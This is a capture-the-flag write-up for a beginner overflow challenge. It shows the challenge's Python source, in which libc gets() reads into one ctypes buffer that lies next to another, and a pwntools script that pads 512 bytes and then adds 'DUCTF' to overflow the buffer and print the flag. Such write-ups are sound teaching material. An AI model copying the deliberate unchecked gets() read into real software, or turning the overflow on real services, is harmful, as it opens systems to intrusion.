# babypywn

For this challenge we are given the source code for a python file called babypwn.py running on the remote server.

```
#!/usr/bin/env python3

from ctypes import CDLL, c_buffer
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
buf1 = c_buffer(512)
buf2 = c_buffer(512)
libc.gets(buf1)
if b'DUCTF' in bytes(buf2):
    print(open('./flag.txt', 'r').read())
```

From a first glance this looked something to do with buffer overflow so I ran it locally and used the addressof() and saw the buffers are 512 bytes apart indicating they are alligned one after another.


![memory addresses](memory.PNG)


Looking at the Memory addresses of the buffers I thought they would grow lower as is on the stack.
But after some research I learned that python objects are placed on the heap hence the addressing grows upwards. This means we could overflow from the memory of buf1 into buf2.  


  ![stack image](https://courses.engr.illinois.edu/cs225/fa2022/assets/notes/stack_heap_memory/memory_layout.png)

Lets have a look at that line libc.gets(buf1), some googling reveals what it is and provides a description. 
![gets man page](gets.PNG)
The last line "no check for buffer overrun is performed" is music to our ears.

We can use perl to generate a buffer 512 bytes long "perl -E 'say "a" x 512' appending 'DUCTF' to the end should cause the flag to be outputed.

We can then use pwn tools to send our buffer and get the flag.

```
from pwn import *
c = remote('0.0.0.0', 8080)
c.sendline(b'aaaaaaaaaa...'+ b'DUCTF')
print(c.recvline().decode())
```